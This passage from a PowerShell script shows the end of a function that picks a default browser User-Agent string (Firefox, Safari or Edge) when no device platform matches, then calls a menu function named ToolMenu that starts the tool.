                Write-Warning "Device platform not found, defaulting to Windows/Firefox"
                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:70.0) Gecko/20100101 Firefox/70.0'
            } elseif ($Browser -eq 'Safari') {
                Write-Warning "Device platform not found, defaulting to Safari"
                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'
            } else {
                Write-Warning "Device platform not found, defaulting to Windows/Edge"
                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042'
            }
        }
        Write-Host ("$UserAgent")
        return $UserAgent
    }
}


# Start the tool
ToolMenu
